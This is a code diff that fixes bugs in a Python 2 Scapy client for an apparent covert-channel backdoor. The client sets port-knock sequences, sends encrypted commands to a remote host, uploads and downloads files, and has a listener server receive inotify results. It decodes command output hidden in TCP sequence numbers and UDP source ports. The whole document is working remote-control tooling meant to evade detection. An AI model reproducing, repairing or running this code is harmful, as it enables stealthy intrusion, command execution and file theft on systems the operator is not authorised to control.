@@ -73,27 +73,27 @@ def main():
 		print "Q - Exit program"
 		print "Input Command: "
 
-		choice = Raw_input()
+		choice = raw_input()
 		if choice == 'C' or choice == 'C':
 			print "Input the transport-later protocol to use: "
-			proto = Raw_input()
+			proto = raw_input()
 			if proto.lowercase == "tcp" or proto.lowercase == "udp":
 				protocol = proto.lowercase()
 			else:
 				warnings = warnings + "Supported protocols include tcp and UDP\n"
 		elif choice == 'A' or choice == 'a':
 			print "Input new server address: "
-			address = Raw_input()
+			address = raw_input()
 		elif choice == 'D' or choice == 'd':
 			print "Input new Port: "
-			port = Raw_input()
+			port = raw_input()
 		elif choice == 'P' or choice == 'p':
 			print "Input new Password: "
-			password = Raw_input()
+			password = raw_input()
 		elif choice == 'K' or choice == 'k':
 			print "Input new Port Knock sequence."
 			print "Each port number should be comma deliminated: "
-			ports = Raw_input()
+			ports = raw_input()
 			knock[:] = []
 			for port in ports.split(","):
 				knock.append(int(port))
@@ -253,24 +253,24 @@ def sendCommand(address, port):
 		print "Note: These actions will terminate the client's connection to the server"
 		print "Input Command: "
 
-		choice = Raw_input()
+		choice = raw_input()
 		if choice == 'U' or choice == 'u':
 			print "Input file to upload: "
-			sFile = Raw_input()
+			sFile = raw_input()
 			sendFile(address, port, sFile)
 		elif choice == 'D' or choice == 'd':
 			print "Input file to download: "
-			gFile = Raw_input()
+			gFile = raw_input()
 			getFile(address, port, gFile)
 		elif choice == 'T' or choice == 't':
 			print "Input terminal command: "
-			command = Raw_input()
+			command = raw_input()
 			terminal(address, port, command)
 		elif choice == 'I' or choice == 'i':
 			print "Input file or directory to be watched: "
-			notice = Raw_input()
+			notice = raw_input()
 			print "Input IP address of listening server which should receive iNotify results: "
-			listener = Raw_input()
+			listener = raw_input()
 			notify(address, port, notice, listener)
 			return
 		elif choice == 'K' or choice == 'k':
@@ -316,7 +316,7 @@ def sendCommand(address, port):
 def sendFile(address, port, sFile):
 	if protocol == "tcp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
-			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215))/\
+			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="")/\
 			            Raw(LOAD=encrypt(sFile))
 		send(commandPacket, verose=0)
 		with open(sFile, "r") as tFile:
@@ -378,7 +378,7 @@ def getFile(address, port, gFile):
 
 	with open(gFile, "w") as tFile:
 		while True:
-			dPacket = sniff(filter=protocol + " sport " + str(port) + " and ip src " + address, count=1, timeout=30)
+			dPacket = sniff(filter=protocol + " and src port " + str(port) + " and ip src " + address, count=1, timeout=30)
 			if len(dPacket) == 0:
 				break
 			if "F" in dPacket[0][TCP].flags:
@@ -412,18 +412,18 @@ def terminal(address, port, command):
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            TCP(sport=random.randint(0, 65535), dport=port, seq=random.randint(0, 16777215), flags="S")/\
 			            Raw(load=encrypt(command))
-		send(commandPacket, verose=0)
+		send(commandPacket, verbose=0)
 	
 		while True:
-			dPacket = sniff(filter="tcp sport " + str(port) + " and ip src " + address, count=1, timeout=30)
+			dPacket = sniff(filter="tcp and src port " + str(port) + " and ip src " + address, count=1, timeout=30)
 			if len(dPacket) == 0:
 				break
-			if "F" in dPacket[0][TCP].flags:
+			if dPacket[0][TCP].flags == 1:
 				break
-			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>24))
-			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>16))
-			result = result + chr(0x000000FF^(dPacket[0][TCP].seq>>8))
-			result = result + chr(0x000000FF^(dPacket[0][TCP].seq))
+			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>24))
+			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>16))
+			result = result + chr(0x000000FF&(dPacket[0][TCP].seq>>8))
+			result = result + chr(0x000000FF&(dPacket[0][TCP].seq))
 	elif protocol == "udp":
 		commandPacket = IP(dst=address, id=random.randint(0, 65535))/\
 			            UDP(sport=(random.randint(0, 255)<<8) + 4, dport=port)/\
@@ -439,7 +439,7 @@ def terminal(address, port, command):
 			result = result + chr(0x00FF^(dPacket[0][UDP].sport>>8))
 			result = result + chr(0x00FF^(dPacket[0][UDP].sport))
 
-	print encrypt(result)
+	print result
 
 '''
 ---------------------------------------------------------------------------------------------
